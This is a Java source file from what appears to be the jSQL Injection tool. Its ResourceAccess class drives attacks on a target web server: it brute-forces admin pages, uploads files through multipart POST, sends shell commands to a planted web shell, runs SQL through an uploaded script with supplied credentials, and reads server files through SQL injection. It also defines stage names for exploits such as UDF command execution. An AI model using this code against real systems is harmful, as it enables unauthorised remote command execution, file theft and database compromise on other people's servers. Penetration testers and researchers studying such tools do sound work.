/*******************************************************************************
 * Copyhacked (H) 2012-2025.
 * This program and the accompanying materials
 * are made available under no term at all, use it like
 * you want, but share and discuss it
 * every time possible with every body.
 * 
 * Contributors:
 *      ron190 at ymail dot com - initial implementation
 ******************************************************************************/
package com.jsql.model.accessible;

import com.jsql.model.InjectionModel;
import com.jsql.model.accessible.vendor.*;
import com.jsql.model.bean.database.MockElement;
import com.jsql.model.bean.util.Header;
import com.jsql.model.bean.util.Interaction;
import com.jsql.model.bean.util.Request;
import com.jsql.model.exception.JSqlException;
import com.jsql.model.suspendable.SuspendableGetRows;
import com.jsql.util.ConnectionUtil;
import com.jsql.util.LogLevelUtil;
import org.apache.commons.lang3.StringUtils;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.net.URI;
import java.net.URLEncoder;
import java.net.http.HttpHeaders;
import java.net.http.HttpRequest;
import java.net.http.HttpRequest.BodyPublishers;
import java.net.http.HttpResponse;
import java.net.http.HttpResponse.BodyHandlers;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.time.Duration;
import java.util.*;
import java.util.concurrent.CompletionService;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorCompletionService;
import java.util.concurrent.ExecutorService;
import java.util.function.BinaryOperator;
import java.util.regex.Pattern;

/**
 * Resource access object.
 * Get information from file system, commands, webpage.
 */
public class ResourceAccess {
    
    /**
     * Log4j logger sent to view.
     */
    private static final Logger LOGGER = LogManager.getRootLogger();

    /**
     * True if admin page should stop, false otherwise.
     */
    private boolean isSearchAdminStopped = false;
    
    /**
     * True if scan list should stop, false otherwise.
     */
    private boolean isScanStopped = false;

    /**
     * True if ongoing file reading must stop, false otherwise.
     * If true any new file read is cancelled at start.
     */
    private boolean isSearchFileStopped = false;

    /**
     * List of ongoing jobs.
     */
    private final List<CallableFile> callablesReadFile = new ArrayList<>();
    private final InjectionModel injectionModel;
    private final ExploitSqlite exploitSqlite;
    private final ExploitMysql exploitMysql;
    private final ExploitOracle exploitOracle;
    private final ExploitPostgres exploitPostgres;
    private final ExploitHsqldb exploitHsqldb;
    private final ExploitH2 exploitH2;
    private final ExploitDerby exploitDerby;

    // compatible cross-platform win+linux (spaces around plus sign required)
    public static final String WEB_CONFIRM_CMD = URLEncoder.encode("expr 133707330 + 10001", StandardCharsets.ISO_8859_1);
    public static final String WEB_CONFIRM_RESULT = "133717331";
    public static final String SQL_CONFIRM_CMD = "select 1337";
    public static final String SQL_CONFIRM_RESULT = "| 1337 |";

    public static final String SQL_DOT_PHP = "sql.php";
    public static final String EXPLOIT_DOT_UPL = "exploit.upl";
    public static final String EXPLOIT_DOT_WEB = "exploit.web";
    public static final String UPLOAD_SUCCESSFUL = "Upload successful: ack received for {}{}";
    public static final String UPLOAD_FAILURE = "Upload failure: missing ack for {}{}";

    public static final String LOID_NOT_FOUND = "Exploit loid not found";
    public static final String ADD_LOID = "loid#create";
    public static final String WRITE_LOID = "loid#write";
    public static final String READ_LOID = "loid#read";

    public static final String ADD_FUNC = "body#add-func";
    public static final String RUN_FUNC = "body#run-func";
    public static final String BODY_CONFIRM = "body#confirm";
    public static final String UDF_RUN_CMD = "udf#run-cmd";

    public static final String TBL_CREATE = "tbl#create";
    public static final String TBL_FILL = "tbl#fill";
    public static final String TBL_DUMP = "tbl#dump";
    public static final String TBL_DROP = "tbl#drop";
    public static final String TBL_READ = "tbl#read";

    public static final String FILE_READ = "file#read";

    // TODO should redirect error directly to default output
    public static final String TEMPLATE_ERROR = "Command failure: %s\nTry '%s 2>&1' to get a system error message.\n";

    public ResourceAccess(InjectionModel injectionModel) {
        this.injectionModel = injectionModel;
        this.exploitSqlite = new ExploitSqlite(injectionModel);
        this.exploitMysql = new ExploitMysql(injectionModel);
        this.exploitOracle = new ExploitOracle(injectionModel);
        this.exploitPostgres = new ExploitPostgres(injectionModel);
        this.exploitHsqldb = new ExploitHsqldb(injectionModel);
        this.exploitH2 = new ExploitH2(injectionModel);
        this.exploitDerby = new ExploitDerby(injectionModel);
    }

    /**
     * Check if every page in the list responds 200 Success.
     * @param pageNames    List of admin pages to test
     */
    public int createAdminPages(String urlInjection, List<String> pageNames) {
        var matcher = Pattern.compile("^((https?://)?[^/]*)(.*)").matcher(urlInjection);
        matcher.find();
        String urlProtocol = matcher.group(1);
        String urlWithoutProtocol = matcher.group(3);

        List<String> folderSplits = new ArrayList<>();

        // Hostname only
        if (urlWithoutProtocol.isEmpty() || !Pattern.matches("^/.*", urlWithoutProtocol)) {
            urlWithoutProtocol = "/dummy";
        }
        String[] splits = urlWithoutProtocol.split("/", -1);
        String[] folderNames = Arrays.copyOf(splits, splits.length - 1);
        for (String folderName: folderNames) {
            folderSplits.add(folderName +"/");
        }

        ExecutorService taskExecutor = this.injectionModel.getMediatorUtils().getThreadUtil().getExecutor("CallableGetAdminPage");
        CompletionService<CallableHttpHead> taskCompletionService = new ExecutorCompletionService<>(taskExecutor);

        var urlPart = new StringBuilder();
        for (String segment: folderSplits) {
            urlPart.append(segment);
            for (String pageName: pageNames) {
                taskCompletionService.submit(
                    new CallableHttpHead(
                        urlProtocol + urlPart + pageName,
                        this.injectionModel,
                        "check:page"
                    )
                );
            }
        }

        var nbAdminPagesFound = 0;
        int submittedTasks = folderSplits.size() * pageNames.size();
        int tasksHandled;
        for (
            tasksHandled = 0
            ; tasksHandled < submittedTasks && !this.isSearchAdminStopped()
            ; tasksHandled++
        ) {
            nbAdminPagesFound = this.callAdminPage(taskCompletionService, nbAdminPagesFound);
        }

        this.injectionModel.getMediatorUtils().getThreadUtil().shutdown(taskExecutor);
        this.isSearchAdminStopped = false;
        this.logSearchAdminPage(nbAdminPagesFound, submittedTasks, tasksHandled);

        return nbAdminPagesFound;
    }

    public int callAdminPage(CompletionService<CallableHttpHead> taskCompletionService, int nbAdminPagesFound) {
        int nbAdminPagesFoundFixed = nbAdminPagesFound;
        
        try {
            CallableHttpHead currentCallable = taskCompletionService.take().get();
            if (currentCallable.isHttpResponseOk()) {
                var request = new Request();
                request.setMessage(Interaction.CREATE_ADMIN_PAGE_TAB);
                request.setParameters(currentCallable.getUrl());
                this.injectionModel.sendToViews(request);

                nbAdminPagesFoundFixed++;
                LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, "Found page: {}", currentCallable.getUrl());
            }
        } catch (InterruptedException e) {
            LOGGER.log(LogLevelUtil.IGNORE, e, e);
            Thread.currentThread().interrupt();
        } catch (ExecutionException e) {
            LOGGER.log(LogLevelUtil.CONSOLE_JAVA, e, e);
        }
        return nbAdminPagesFoundFixed;
    }

    public void logSearchAdminPage(int nbAdminPagesFound, int submittedTasks, int tasksHandled) {
        var result = String.format(
            "Searched %s/%s page%s: %s found",
            tasksHandled,
            submittedTasks,
            tasksHandled > 1 ? 's' : StringUtils.EMPTY,
            nbAdminPagesFound
        );
        
        if (nbAdminPagesFound > 0) {
            LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, result);
        } else {
            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, result);
        }
    }

    public String checkUrls(String urlExploit, String nameExploit, BinaryOperator<String> biFuncGetRequest) {
        String urlExploitFixed = urlExploit;
        if (!urlExploitFixed.isEmpty()) {
            urlExploitFixed = urlExploitFixed.replaceAll("/*$", StringUtils.EMPTY) +"/";
        }
        String url = urlExploitFixed;
        if (StringUtils.isEmpty(url)) {
            url = this.injectionModel.getMediatorUtils().getConnectionUtil().getUrlBase();
        }
        String urlWithoutProtocol = url.replaceAll("^https?://[^/]*", StringUtils.EMPTY);
        String urlProtocol;
        if ("/".equals(urlWithoutProtocol)) {
            urlProtocol = url.replaceAll("/+$", StringUtils.EMPTY);
        } else {
            urlProtocol = url.replace(urlWithoutProtocol, StringUtils.EMPTY);
        }

        List<String> directoryNames = new ArrayList<>();
        String urlWithoutFileName = urlWithoutProtocol.replaceAll("[^/]*$", StringUtils.EMPTY).replaceAll("/+", "/");
        if (urlWithoutFileName.split("/").length == 0) {
            directoryNames.add("/");
        }
        for (String directoryName: urlWithoutFileName.split("/")) {
            directoryNames.add(directoryName +"/");
        }
        String urlSuccess = this.getExploitUrl(nameExploit, directoryNames, urlProtocol);
        if (urlSuccess != null) {
            urlSuccess = biFuncGetRequest.apply(nameExploit, urlSuccess);
        } else {
            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Exploit access failure: connection URL not found");
        }
        return urlSuccess;
    }

    private String getExploitUrl(String filename, List<String> directoryNames, String urlProtocol) {
        ExecutorService taskExecutor = this.injectionModel.getMediatorUtils().getThreadUtil().getExecutor("CallableGetExploitUrl");
        CompletionService<CallableHttpHead> taskCompletionService = new ExecutorCompletionService<>(taskExecutor);
        var urlPart = new StringBuilder();

        for (String segment: directoryNames) {
            urlPart.append(segment);
            taskCompletionService.submit(
                new CallableHttpHead(
                    urlProtocol + urlPart + filename,
                    this.injectionModel,
                    "xplt#confirm-url"
                )
            );
        }

        String urlSuccess = null;
        int submittedTasks = directoryNames.size();
        for (var tasksHandled = 0 ; tasksHandled < submittedTasks ; tasksHandled++) {
            try {
                CallableHttpHead currentCallable = taskCompletionService.take().get();
                if (currentCallable.isHttpResponseOk()) {
                    urlSuccess = currentCallable.getUrl();
                    LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, "Connection successful to [{}]", currentCallable.getUrl());
                    break;
                }
            } catch (InterruptedException e) {
                LOGGER.log(LogLevelUtil.IGNORE, e, e);
                Thread.currentThread().interrupt();
            } catch (ExecutionException e) {
                LOGGER.log(LogLevelUtil.CONSOLE_JAVA, e, e);
            }
        }

        this.injectionModel.getMediatorUtils().getThreadUtil().shutdown(taskExecutor);
        return urlSuccess;
    }

    public String callCommand(String urlCommand) {
        return this.callCommand(urlCommand, false);
    }

    public String callCommand(String urlCommand, boolean isConnectIssueIgnored) {
        String pageSource;
        try {
            pageSource = this.injectionModel.getMediatorUtils().getConnectionUtil().getSource(urlCommand, isConnectIssueIgnored);
        } catch (Exception e) {
            pageSource = StringUtils.EMPTY;
        }
        
        var regexSearch = Pattern.compile("(?s)<"+ DataAccess.LEAD +">(.*?)<"+ DataAccess.TRAIL +">").matcher(pageSource);
        regexSearch.find();

        String result;
        // IllegalStateException #1544: catch incorrect execution
        try {
            result = regexSearch.group(1);
        } catch (IllegalStateException e) {
            result = StringUtils.EMPTY;  // fix return null from regex
            if (!isConnectIssueIgnored) {
                LOGGER.log(LogLevelUtil.CONSOLE_ERROR, String.format(ResourceAccess.TEMPLATE_ERROR, "empty result", "command"));
            }
        }
        return result;
    }
    
    /**
     * Run a shell command on host.
     * @param command The command to execute
     * @param uuidShell An unique identifier for terminal
     * @param urlExploit Web path of the shell
     */
    public String runWebShell(String command, UUID uuidShell, String urlExploit) {
        return this.runWebShell(command, uuidShell, urlExploit, false);
    }
    public String runWebShell(String command, UUID uuidShell, String urlExploit, boolean isConnectIssueIgnored) {
        String result = this.callCommand(
            urlExploit +"?c="+ URLEncoder.encode(command, StandardCharsets.ISO_8859_1),
            isConnectIssueIgnored
        );
        if (StringUtils.isBlank(result)) {
            result = String.format(ResourceAccess.TEMPLATE_ERROR, "empty result", command);
        }
        var request = new Request();  // Unfreeze GUI terminal
        request.setMessage(Interaction.GET_EXPLOIT_WEB_RESULT);
        request.setParameters(uuidShell, result);
        this.injectionModel.sendToViews(request);
        return result;
    }

    /**
     * Execute SQL request into terminal defined by URL path, eventually override with database user/pass identifiers.
     * @param command SQL request to execute
     * @param uuidShell Identifier of terminal sending the request
     * @param urlExploit URL to send SQL request against
     * @param username Username [optional]
     * @param password password [optional]
     */
    public String runSqlShell(String command, UUID uuidShell, String urlExploit, String username, String password) {
        return this.runSqlShell(command, uuidShell, urlExploit, username, password, true);
    }

    public String runSqlShell(String command, UUID uuidShell, String urlExploit, String username, String password, boolean isResultSentToView) {
        String result = this.callCommand(String.format(
             "%s?q=%s&u=%s&p=%s",
             urlExploit,
             URLEncoder.encode(command, StandardCharsets.ISO_8859_1),
             username,
             password
        ));
            
        if (result.contains("<SQLr>")) {
            List<List<String>> listRows = this.parse(result);
            if (listRows.isEmpty()) {
                result = "Result not found: check your credentials or review logs in tab Network\n";
            } else {
                List<Integer> listFieldsLength = this.parseColumnLength(listRows);
                result = this.convert(listRows, listFieldsLength);
            }
        } else if (result.contains("<SQLm>")) {  // todo deprecated
            result = result.replace("<SQLm>", StringUtils.EMPTY) +"\n";
        } else if (result.contains("<SQLe>")) {  // todo deprecated
            result = result.replace("<SQLe>", StringUtils.EMPTY) +"\n";
        }

        if (isResultSentToView) {
            var request = new Request();  // Unfreeze GUI terminal
            request.setMessage(Interaction.GET_EXPLOIT_SQL_RESULT);
            request.setParameters(uuidShell, result, command);
            this.injectionModel.sendToViews(request);
        }
        return result;
    }

    private String convert(List<List<String>> listRows, List<Integer> listFieldsLength) {
        var tableText = new StringBuilder("+");
        for (Integer fieldLength: listFieldsLength) {
            tableText.append("-").append(StringUtils.repeat("-", fieldLength)).append("-+");
        }
        tableText.append("\n");
        for (List<String> listFields: listRows) {
            tableText.append("|");
            var cursorPosition = 0;
            for (String field: listFields) {
                tableText.append(StringUtils.SPACE)
                    .append(field)
                    .append(StringUtils.repeat(StringUtils.SPACE, listFieldsLength.get(cursorPosition) - field.length()))
                    .append(" |");
                cursorPosition++;
            }
            tableText.append("\n");
        }
        tableText.append("+");
        for (Integer fieldLength: listFieldsLength) {
            tableText.append("-").append(StringUtils.repeat("-", fieldLength)).append("-+");
        }
        tableText.append("\n");
        return tableText.toString();
    }

    private List<Integer> parseColumnLength(List<List<String>> listRows) {
        List<Integer> listFieldsLength = new ArrayList<>();
        for (
            var indexLongestRowSearch = 0;
            indexLongestRowSearch < listRows.get(0).size();
            indexLongestRowSearch++
        ) {
            int indexLongestRowSearchFinal = indexLongestRowSearch;
            listRows.sort(
                (firstRow, secondRow) -> secondRow.get(indexLongestRowSearchFinal).length() - firstRow.get(indexLongestRowSearchFinal).length()
            );
            listFieldsLength.add(listRows.get(0).get(indexLongestRowSearch).length());
        }
        return listFieldsLength;
    }

    private List<List<String>> parse(String result) {
        List<List<String>> listRows = new ArrayList<>();
        var rowsMatcher = Pattern.compile("(?si)<tr>(<td>.*?</td>)</tr>").matcher(result);
        while (rowsMatcher.find()) {
            String values = rowsMatcher.group(1);
            var fieldsMatcher = Pattern.compile("(?si)<td>(.*?)</td>").matcher(values);
            List<String> listFields = new ArrayList<>();
            listRows.add(listFields);
            
            while (fieldsMatcher.find()) {
                String field = fieldsMatcher.group(1);
                listFields.add(field);
            }
        }
        return listRows;
    }

    public HttpResponse<String> upload(File file, String url, InputStream streamToUpload) throws IOException, JSqlException, InterruptedException {
        var crLf = "\r\n";
        var boundary = "---------------------------4664151417711";
        
        var streamData = new byte[streamToUpload.available()];
        if (streamToUpload.read(streamData) == -1) {
            throw new JSqlException("Error reading the file");
        }
        
        String headerForm = StringUtils.EMPTY;
        headerForm += "--"+ boundary + crLf;
        headerForm += "Content-Disposition: form-data; name=\"u\"; filename=\""+ file.getName() +"\""+ crLf;
        headerForm += "Content-Type: binary/octet-stream"+ crLf;
        headerForm += crLf;

        String headerFile = StringUtils.EMPTY;
        headerFile += crLf +"--"+ boundary +"--"+ crLf;

        var httpRequest = HttpRequest.newBuilder()
            .uri(URI.create(url))
            .timeout(Duration.ofSeconds(15))
            .POST(BodyPublishers.ofByteArrays(
                Arrays.asList(
                    headerForm.getBytes(StandardCharsets.UTF_8),
                    Files.readAllBytes(Paths.get(file.toURI())),
                    headerFile.getBytes(StandardCharsets.UTF_8)
                )
            ))
            .setHeader("Content-Type", "multipart/form-data; boundary=" + boundary)
            .build();

        var response = this.injectionModel.getMediatorUtils().getConnectionUtil().getHttpClient().build().send(httpRequest, BodyHandlers.ofString());
        HttpHeaders httpHeaders = response.headers();
        String pageSource = response.body();

        Map<Header, Object> msgHeader = new EnumMap<>(Header.class);
        msgHeader.put(Header.URL, url);
        msgHeader.put(Header.HEADER, ConnectionUtil.getHeadersMap(httpRequest.headers()));
        msgHeader.put(Header.RESPONSE, ConnectionUtil.getHeadersMap(httpHeaders));
        msgHeader.put(Header.SOURCE, pageSource);
        msgHeader.put(Header.METADATA_PROCESS, "upl#multipart");
        var request = new Request();
        request.setMessage(Interaction.MESSAGE_HEADER);
        request.setParameters(msgHeader);
        this.injectionModel.sendToViews(request);
        return response;
    }
    
    /**
     * Check if current user can read files.
     * @return True if user can read file, false otherwise
     * @throws JSqlException when an error occurs during injection
     */
    public boolean isMysqlReadDenied() throws JSqlException {
        var sourcePage = new String[]{ StringUtils.EMPTY };
        String resultInjection = new SuspendableGetRows(this.injectionModel).run(
            this.injectionModel.getResourceAccess().getExploitMysql().getModelYaml().getFile().getPrivilege(),
            sourcePage,
            false,
            1,
            MockElement.MOCK,
            "privilege"
        );

        boolean readingIsAllowed = false;

        if (StringUtils.isEmpty(resultInjection)) {
            this.injectionModel.sendResponseFromSite("Can't read privilege", sourcePage[0].trim());
            var request = new Request();
            request.setMessage(Interaction.MARK_FILE_SYSTEM_INVULNERABLE);
            this.injectionModel.sendToViews(request);
        } else if ("false".equals(resultInjection)) {
            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Privilege FILE not granted: files not readable by current user");
            var request = new Request();
            request.setMessage(Interaction.MARK_FILE_SYSTEM_INVULNERABLE);
            this.injectionModel.sendToViews(request);
        } else {
            var request = new Request();
            request.setMessage(Interaction.MARK_FILE_SYSTEM_VULNERABLE);
            this.injectionModel.sendToViews(request);
            readingIsAllowed = true;
        }
        
        return !readingIsAllowed;
    }

    /**
     * Attempt to read files in parallel by their path from the website using injection.
     * Reading file needs a FILE right on the server.
     * The user can interrupt the process at any time.
     * @param pathsFiles List of file paths to read
     * @throws JSqlException when an error occurs during injection
     * @throws InterruptedException if the current thread was interrupted while waiting
     * @throws ExecutionException if the computation threw an exception
     */
    public List<String> readFile(List<String> pathsFiles) throws JSqlException, InterruptedException, ExecutionException {
        if (
            this.injectionModel.getMediatorVendor().getVendor() == this.injectionModel.getMediatorVendor().getMysql()
            && this.isMysqlReadDenied()
        ) {
            return Collections.emptyList();
        }

        var countFileFound = 0;
        var results = new ArrayList<String>();

        ExecutorService taskExecutor = this.injectionModel.getMediatorUtils().getThreadUtil().getExecutor("CallableReadFile");
        CompletionService<CallableFile> taskCompletionService = new ExecutorCompletionService<>(taskExecutor);

        for (String pathFile: pathsFiles) {
            var callableFile = new CallableFile(pathFile, this.injectionModel);
            taskCompletionService.submit(callableFile);
            this.callablesReadFile.add(callableFile);
        }

        List<String> duplicate = new ArrayList<>();
        int submittedTasks = pathsFiles.size();
        int tasksHandled;

        for (
            tasksHandled = 0
            ; tasksHandled < submittedTasks && !this.isSearchFileStopped
            ; tasksHandled++
        ) {
            var currentCallable = taskCompletionService.take().get();
            if (StringUtils.isNotEmpty(currentCallable.getSourceFile())) {
                var name = currentCallable.getPathFile().substring(
                    currentCallable.getPathFile().lastIndexOf('/') + 1
                );
                String content = currentCallable.getSourceFile();
                String path = currentCallable.getPathFile();

                var request = new Request();
                request.setMessage(Interaction.CREATE_FILE_TAB);
                request.setParameters(name, content, path);
                this.injectionModel.sendToViews(request);

                if (!duplicate.contains(path.replace(name, StringUtils.EMPTY))) {
                    LOGGER.log(
                        LogLevelUtil.CONSOLE_INFORM,
                        "Folder exploit candidate: {}",
                        () -> path.replace(name, StringUtils.EMPTY)
                    );
                }

                duplicate.add(path.replace(name, StringUtils.EMPTY));
                results.add(content);

                countFileFound++;
            }
        }

        // Force ongoing suspendables to stop immediately
        for (CallableFile callableReadFile: this.callablesReadFile) {
            callableReadFile.getSuspendableReadFile().stop();
        }
        this.callablesReadFile.clear();
        this.injectionModel.getMediatorUtils().getThreadUtil().shutdown(taskExecutor);
        this.isSearchFileStopped = false;

        var result = String.format(
            "Searched %s/%s file%s: %s found",
            tasksHandled,
            submittedTasks,
            tasksHandled > 1 ? 's' : StringUtils.EMPTY,
            countFileFound
        );

        if (countFileFound > 0) {
            LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, result);
        } else {
            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, result);
        }
        return results;
    }

    public String getResult(String query, String metadata) throws JSqlException {
        var sourcePage = new String[]{ StringUtils.EMPTY };
        return new SuspendableGetRows(this.injectionModel).run(
            query,
            sourcePage,
            false,
            0,
            MockElement.MOCK,
            metadata
        );
    }

    public String getResultWithCatch(String query, String metadata) {
        var sourcePage = new String[]{ StringUtils.EMPTY };
        try {
            return new SuspendableGetRows(this.injectionModel).run(
                query,
                sourcePage,
                false,
                0,
                MockElement.MOCK,
                metadata
            );
        } catch (JSqlException ignored) {
            return StringUtils.EMPTY;
        }
    }

    /**
     * Mark the search of files to stop.
     * Any ongoing file reading is interrupted and any new file read
     * is cancelled.
     */
    public void stopSearchFile() {
        this.isSearchFileStopped = true;
        for (CallableFile callable: this.callablesReadFile) {
            callable.getSuspendableReadFile().stop();  // force ongoing business to stop immediately
        }
    }

    public void stopSearchAdmin() {
        this.isSearchAdminStopped = true;
    }


    // Getters and setters

    public ExploitSqlite getExploitSqlite() {
        return this.exploitSqlite;
    }

    public ExploitMysql getExploitMysql() {
        return this.exploitMysql;
    }

    public ExploitOracle getExploitOracle() {
        return this.exploitOracle;
    }

    public ExploitPostgres getExploitPostgres() {
        return this.exploitPostgres;
    }

    public boolean isSearchAdminStopped() {
        return this.isSearchAdminStopped;
    }
    
    public void setScanStopped(boolean isScanStopped) {
        this.isScanStopped = isScanStopped;
    }

    public boolean isScanStopped() {
        return this.isScanStopped;
    }

    public ExploitHsqldb getExploitHsqldb() {
        return this.exploitHsqldb;
    }

    public ExploitH2 getExploitH2() {
        return this.exploitH2;
    }

    public ExploitDerby getExploitDerby() {
        return this.exploitDerby;
    }
}
